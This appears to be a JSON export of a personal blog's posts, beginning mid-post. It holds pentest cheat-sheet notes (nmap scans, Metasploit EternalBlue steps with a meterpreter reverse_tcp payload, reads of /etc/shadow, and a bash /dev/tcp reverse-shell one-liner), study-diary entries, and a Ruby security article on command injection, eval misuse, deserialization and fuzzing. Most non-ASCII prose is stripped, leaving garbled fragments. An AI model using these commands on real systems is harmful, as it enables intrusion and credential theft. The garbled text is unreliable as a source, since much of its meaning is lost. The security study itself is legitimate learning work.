class=\"line\">nmap 192.168.0.100-110</span><br></pre></td></tr></table></figure>\n\n<p><strong>4</strong></p>\n<p>namp xxx.xxx.xxx.xxx&#x2F;xx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>5</strong></p>\n<p>nmap -iL <File path></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -iL /root/target.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>6</strong></p>\n<p>nmap ip -exclude ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.0.100-110 -exclude 192.168.0.103</span><br><span class=\"line\">   nmap 192.168.0.1/24 -exclude 192.168.0.103 </span><br></pre></td></tr></table></figure>\n\n<p><strong>7</strong></p>\n<p>nmap ip -p 123</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:nmap 192.168.0.101 -p 80,8080,3306,3389</span><br></pre></td></tr></table></figure>\n\n<p><strong>8C</strong></p>\n<p>nmap -sP ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sP 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>9</strong></p>\n<p>nmap -O ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -O 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>10</strong></p>\n<p>nmap -sS -p (,) -v ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -p 1-65535 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"MSF\"><a href=\"#MSF\" class=\"headerlink\" title=\"MSF\"></a>MSF</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>MetasploitMSF</p>\n<p><strong></strong></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p> : <code>search ms17_010</code></p>\n<p>1</p>\n<p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p>\n<p><code>options</code> </p>\n<p><code>set rhosts 192.168.174.129</code></p>\n<p>445nmapwindows445<code>set rport </code></p>\n<p><code>run</code><code>exploit</code> </p>\n<p>2</p>\n<p><code>use exploit/windows/smb/ms17_010_eternalblue</code></p>\n<p><code>options</code> </p>\n<p><code>set RHOSTS 192.168.174.129</code></p>\n<p><code>set RPORT 445</code></p>\n<p>payload<code>set payload windows/x64/meterpreter/reverse_tcp</code></p>\n<p><code>set LHOST 192.168.174.192</code></p>\n<p><code>run</code><code>exploit</code> </p>\n<h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><p><strong>netstat</strong></p>\n<p></p>\n<p>netstat []</p>\n<p></p>\n<ul>\n<li>-a</li>\n<li>-n</li>\n<li>-p</li>\n<li>-tTCP</li>\n<li>-uUDP</li>\n<li>-r</li>\n</ul>\n<p><strong>network</strong></p>\n<p></p>\n<p>networkservice network restart</p>\n<p><strong>chmod</strong></p>\n<p></p>\n<p>Linux</p>\n<ul>\n<li> </li>\n<li>d </li>\n<li>s socket</li>\n<li>l </li>\n<li>p </li>\n<li>c </li>\n<li>b </li>\n</ul>\n<p><code>uname -a</code>: Linux!(,Linux)</p>\n<p></p>\n<ul>\n<li>cat &#x2F;etc&#x2F;issue: ,(PS:)</li>\n<li>cat &#x2F;etc&#x2F;<em>-release: (,,</em>ls &#x2F;etc | grep release!)</li>\n<li>cat &#x2F;proc&#x2F;version: ,gcc</li>\n<li>cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version: ,uname -v(&#x2F;proc&#x2F;sys&#x2F;kernelLinux!!)</li>\n</ul>\n<p></p>\n<pre><code>ps: \n    ps -elf: (-l)UID,PPIP,CSTIME(-f)(-e)\n    ps aux: (u)(a)(x)\ntop: Windows\n</code></pre>\n<p><code>cat /etc/passwd</code>: </p>\n<p><code>cat /etc/shadow</code>: ,!</p>\n<p><code>cat /etc/sudoers</code>:    </p>\n<p><code>ifconfig -a</code>: </p>\n<p><code>hostname</code>: </p>\n<h4 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"OSI\"><a href=\"#OSI\" class=\"headerlink\" title=\"OSI\"></a>OSI</h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png\"\n                        alt=\"-1685330434325\"\n                 ><strong></strong>OSI</p>\n<p><strong></strong>,</p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p><strong>IP</strong>&#x2F;</p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<h3 id=\"TCP-IP\"><a href=\"#TCP-IP\" class=\"headerlink\" title=\"TCP&#x2F;IP\"></a>TCP&#x2F;IP</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png\"\n                        alt=\"-1685330444867\"\n                 ></h4><p>TCP&#x2F;IPOSI</p>\n<p>TCP&#x2F;IPOSI</p>\n<p>TCP&#x2F;IPUDP</p>\n<h3 id=\"xsscsrfssrf\"><a href=\"#xsscsrfssrf\" class=\"headerlink\" title=\"xsscsrfssrf\"></a>xsscsrfssrf</h3><p><strong></strong><br> XSSCSRF,SSRFWeb</p>\n<p><strong></strong><br> XSShtml</p>\n<p>CSRF()httpreferCookie  </p>\n<p>SSRF(URLRUL</p>\n"},{"title":"04-10","date":"2024-04-10T13:41:56.000Z","excerpt":"","_content":"# 2024 4 10\n\n## \n\n- 7h14min\n\n## MATH\n\n-  p124\n\n  \n\n## ENGLISH\n\n- 30... \n\n## 408\n\n- b\n\n\n\n## \n\n12\n\n\n\n","source":"_posts/2024_4_10.md","raw":"---\ntitle: 04-10\ndate: 2024-04-10 21:41:56\nexcerpt: \ncategories: \n---\n# 2024 4 10\n\n## \n\n- 7h14min\n\n## MATH\n\n-  p124\n\n  \n\n## ENGLISH\n\n- 30... \n\n## 408\n\n- b\n\n\n\n## \n\n12\n\n\n\n","slug":"2024_4_10","published":1,"updated":"2024-04-12T15:42:03.134Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvdg2y4800006y76h6yycdgn","content":"<h1 id=\"2024-4-10\"><a href=\"#2024-4-10\" class=\"headerlink\" title=\"2024 4 10\"></a>2024 4 10</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>7h14min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p124</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>30 </li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>b</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>12</p>\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-4-10\"><a href=\"#2024-4-10\" class=\"headerlink\" title=\"2024 4 10\"></a>2024 4 10</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>7h14min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p124</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>30 </li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>b</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>12</p>\n<p></p>\n"},{"title":"04-11","date":"2024-04-11T15:22:31.000Z","excerpt":"","_content":"# 2024 4 11\n\n## \n\n- 8h26min\n\n\n\n## MATH\n\n-  p148\n\n  \n\n## ENGLISH\n\n- \n\n\n\n## 408\n\n-  p112\n\n\n\n## \n\ntodo\n\n\n\n4h1h\n\n)\n\n\n![2024-03-30 16.58.15](https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg)\n","source":"_posts/2024_4_11.md","raw":"---\ntitle: 04-11\ndate: 2024-04-11 23:22:31\nexcerpt: \ncategories: \n---\n# 2024 4 11\n\n## \n\n- 8h26min\n\n\n\n## MATH\n\n-  p148\n\n  \n\n## ENGLISH\n\n- \n\n\n\n## 408\n\n-  p112\n\n\n\n## \n\ntodo\n\n\n\n4h1h\n\n)\n\n\n![2024-03-30 16.58.15](https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg)\n","slug":"2024_4_11","published":1,"updated":"2024-04-12T15:45:11.074Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvdg2y4j00016y7674hwb68j","content":"<h1 id=\"2024-4-11\"><a href=\"#2024-4-11\" class=\"headerlink\" title=\"2024 4 11\"></a>2024 4 11</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>8h26min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p148</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li> p112</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>todo</p>\n<p></p>\n<p>4h1h</p>\n<p>)</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg\"\n                        alt=\"2024-03-30 16.58.15\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-4-11\"><a href=\"#2024-4-11\" class=\"headerlink\" title=\"2024 4 11\"></a>2024 4 11</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>8h26min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p148</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li> p112</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>todo</p>\n<p></p>\n<p>4h1h</p>\n<p>)</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg\"\n                        alt=\"2024-03-30 16.58.15\"\n                 ></p>\n"},{"title":"Ruby","date":"2023-05-02T13:51:13.000Z","excerpt":"Ruby","_content":"\n## Ruby\n\nRubyRubyRubyRubyRubyRuby\n\n## Ruby\n\nRuby2090MatzRuby\n\n## ****\n\nRubyRubyonRailsRubyRubywebSQLXSSSSRFRuby\n\n#### ****\n\nsystemlinux\n\n+   \\`\\`\n+   $\n+   ;\n+   |\n+   &\n+   \\\\n\n\n\n\n+   \n+   \n+   syscall\n+   \n+   exec\n+   3.\\*\n\nRuby\n\n+   %x//\n+   \\`\\`\n+   \n+   IO.read\n+   IO.write\n+   IO.binread\n+   IO.binwrite\n+   IO.foreach\n+   IO.readlines\n\n%x//''system\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg)  \n\nopenRuby\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg)  \n\nopenIO.read/IO.write/IO.binread/IO.binwrite/IO.foreach/IO.readlines\n\nopenRuby\n\nFile.readRuby\n\nIO.readlinesRuby\n\n#### ****\n\nevalRubyevalclass\\_evalinstance\\_evaleval\n\nRubyevalclass\\_evalinstance\\_eval\n\n> \n>\n> \\_\\_send\\_\\_\n>\n> public\\_send\n>\n> const\\_get\n>\n> constantize\n\n##### **send**\n\nsendRubyJAVAinvoke\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg)\n\nksendhellohelloeval\n\n![](https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small)\n\n##### **\\_\\_send\\_\\_**\n\n\\_\\_send\\_\\_sendsend\\_\\_send\\_\\_\n\n##### **public\\_send**\n\npublic\\_sendsendsend\n\nsendRuby\n\n\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg)\n\n##### **const\\_get**\n\nconst\\_getRubyinherittruetrueRubyJAVAforName\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg)\n\nconst\\_getRubyrack-proxy\n\n![](https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small)\n\nperform\\_requestNetHTTPHTTPfull\\_pathnewHTTPconst\\_getinheritGitHub\n\n![](https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small)\n\ngitlab\n\nhttps://hackerone.com/reports/1125425 kramdownconst\\_getinheritvakzzRedis\n\n##### **constantize**\n\nconstantizeRubyonRailsconst\\_get\n\n![](https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small)\n\nconstantize\n\n#### ****\n\nRuby\n\n##### ****\n\nMarshalRubyMarshal.dumpMarshal.load\n\nMarshal\n\n+   lhttps://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\n\nPOC\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg)\n\nPOCruby-3.0.0\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg)\n\n\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg)\n\n##### **JSON**\n\nRuby JSONRubyJSONojhttps://github.com/ohler55/ojojJSONObject\n\nPOC\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg)\n\nPOCruby-3.0.0\n\n![image.php?url=YD_cnt_38_01EP10d8ODcL](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg)\n\noj\n\n![](https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small)\n\n##### **YAML**\n\nRuby YAMLpysch 4.0YAML.loadpsych 4.0YAML.unsafe\\_loadPOC\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg)\n\nPOCruby-3.0.0\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg)  \n\nRuby YAMLpsych4.0save\\_loadpsych 4.0loadhttps://github.com/ruby/psych/pull/487\n\nunsafe\\_loadyaml\n\n![](https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small)  \n\n#### ****\n\nRubyRuby^$\\\\A\\\\Z\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg)  \n\n\n\n\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg)  \n\n#### **FUZZ Ruby**\n\nRubyRubyCMarshalFUZZ\n\nFUZZAFLplusplusRuby\n\n> ./configure CC=/opt/AFLplusplus/afl-clang-fast CXX=/opt/AFLplusplus/afl-clang-fast++ --disable-install-doc --disable-install-rdoc --prefix=/usr/local/ruby --enable-debug-env\n>\n> ASAN\\_OPTIONS=detect\\_leaks=0abort\\_on\\_error=1allow\\_user\\_segv\\_handler=0handle\\_abort=1=0\n>\n> AFL\\_USE\\_ASAN=1\n\nAFLplusplusdeferred instrumentationRubymain.c\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg)\n\nRubyRuby hookhookrubygems.rbMarshal\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg)  \n\nFUZZ\n\nFUZZ\n\n1\\. CVE-2022-28738 onig\\_reg\\_resize\n\n![](https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small)  \n\n2\\. CVE-2022-28739 strtod \n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg)  \n\n3\\. calc\\_tm\\_yday\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg)  \n\n4\\. renumber\\_by\\_map\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg)  \n\n5\\. JSON.parse \n\n![](https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small)  \n\nFUZZFUZZ\n\nruby\n\n### ****\n\n> https://hackerone.com/ruby/hacktivity\n>\n> https://bishopfox.com/blog/ruby-vulnerabilities-exploits\n>\n> https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize\n>\n> http://gavinmiller.io/2016/the-safesty-way-to-constantize/\n>\n> https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\n>\n> https://www.elttam.com/blog/ruby-deserialization/\n>\n> https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n>\n> https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\n\n\n","source":"_posts/Ruby.md","raw":"---\ntitle: Ruby\ndate: 2023-05-02 21:51:13\nexcerpt: Ruby\ncategories: \n---\n\n## Ruby\n\nRubyRubyRubyRubyRubyRuby\n\n## Ruby\n\nRuby2090MatzRuby\n\n## ****\n\nRubyRubyonRailsRubyRubywebSQLXSSSSRFRuby\n\n#### ****\n\nsystemlinux\n\n+   \\`\\`\n+   $\n+   ;\n+   |\n+   &\n+   \\\\n\n\n\n\n+   \n+   \n+   syscall\n+   \n+   exec\n+   3.\\*\n\nRuby\n\n+   %x//\n+   \\`\\`\n+   \n+   IO.read\n+   IO.write\n+   IO.binread\n+   IO.binwrite\n+   IO.foreach\n+   IO.readlines\n\n%x//''system\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg)  \n\nopenRuby\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg)  \n\nopenIO.read/IO.write/IO.binread/IO.binwrite/IO.foreach/IO.readlines\n\nopenRuby\n\nFile.readRuby\n\nIO.readlinesRuby\n\n#### ****\n\nevalRubyevalclass\\_evalinstance\\_evaleval\n\nRubyevalclass\\_evalinstance\\_eval\n\n> \n>\n> \\_\\_send\\_\\_\n>\n> public\\_send\n>\n> const\\_get\n>\n> constantize\n\n##### **send**\n\nsendRubyJAVAinvoke\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg)\n\nksendhellohelloeval\n\n![](https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small)\n\n##### **\\_\\_send\\_\\_**\n\n\\_\\_send\\_\\_sendsend\\_\\_send\\_\\_\n\n##### **public\\_send**\n\npublic\\_sendsendsend\n\nsendRuby\n\n\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg)\n\n##### **const\\_get**\n\nconst\\_getRubyinherittruetrueRubyJAVAforName\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg)\n\nconst\\_getRubyrack-proxy\n\n![](https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small)\n\nperform\\_requestNetHTTPHTTPfull\\_pathnewHTTPconst\\_getinheritGitHub\n\n![](https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small)\n\ngitlab\n\nhttps://hackerone.com/reports/1125425 kramdownconst\\_getinheritvakzzRedis\n\n##### **constantize**\n\nconstantizeRubyonRailsconst\\_get\n\n![](https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small)\n\nconstantize\n\n#### ****\n\nRuby\n\n##### ****\n\nMarshalRubyMarshal.dumpMarshal.load\n\nMarshal\n\n+   lhttps://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\n\nPOC\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg)\n\nPOCruby-3.0.0\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg)\n\n\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg)\n\n##### **JSON**\n\nRuby JSONRubyJSONojhttps://github.com/ohler55/ojojJSONObject\n\nPOC\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg)\n\nPOCruby-3.0.0\n\n![image.php?url=YD_cnt_38_01EP10d8ODcL](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg)\n\noj\n\n![](https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small)\n\n##### **YAML**\n\nRuby YAMLpysch 4.0YAML.loadpsych 4.0YAML.unsafe\\_loadPOC\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg)\n\nPOCruby-3.0.0\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg)  \n\nRuby YAMLpsych4.0save\\_loadpsych 4.0loadhttps://github.com/ruby/psych/pull/487\n\nunsafe\\_loadyaml\n\n![](https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small)  \n\n#### ****\n\nRubyRuby^$\\\\A\\\\Z\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg)  \n\n\n\n\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg)  \n\n#### **FUZZ Ruby**\n\nRubyRubyCMarshalFUZZ\n\nFUZZAFLplusplusRuby\n\n> ./configure CC=/opt/AFLplusplus/afl-clang-fast CXX=/opt/AFLplusplus/afl-clang-fast++ --disable-install-doc --disable-install-rdoc --prefix=/usr/local/ruby --enable-debug-env\n>\n> ASAN\\_OPTIONS=detect\\_leaks=0abort\\_on\\_error=1allow\\_user\\_segv\\_handler=0handle\\_abort=1=0\n>\n> AFL\\_USE\\_ASAN=1\n\nAFLplusplusdeferred instrumentationRubymain.c\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg)\n\nRubyRuby hookhookrubygems.rbMarshal\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg)  \n\nFUZZ\n\nFUZZ\n\n1\\. CVE-2022-28738 onig\\_reg\\_resize\n\n![](https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small)  \n\n2\\. CVE-2022-28739 strtod \n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg)  \n\n3\\. calc\\_tm\\_yday\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg)  \n\n4\\. renumber\\_by\\_map\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg)  \n\n5\\. JSON.parse \n\n![](https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small)  \n\nFUZZFUZZ\n\nruby\n\n### ****\n\n> https://hackerone.com/ruby/hacktivity\n>\n> https://bishopfox.com/blog/ruby-vulnerabilities-exploits\n>\n> https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize\n>\n> http://gavinmiller.io/2016/the-safesty-way-to-constantize/\n>\n> https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\n>\n> https://www.elttam.com/blog/ruby-deserialization/\n>\n> https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n>\n> https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\n\n\n","slug":"Ruby","published":1,"updated":"2024-04-25T13:56:17.597Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvfb4qr400006676f52l1nta","content":"<h2 id=\"Ruby\"><a href=\"#Ruby\" class=\"headerlink\" title=\"Ruby\"></a>Ruby</h2><p>RubyRubyRubyRubyRubyRuby</p>\n<h2 id=\"Ruby\"><a href=\"#Ruby\" class=\"headerlink\" title=\"Ruby\"></a>Ruby</h2><p>Ruby2090MatzRuby</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h2><p>RubyRubyonRailsRubyRubywebSQLXSSSSRFRuby</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" 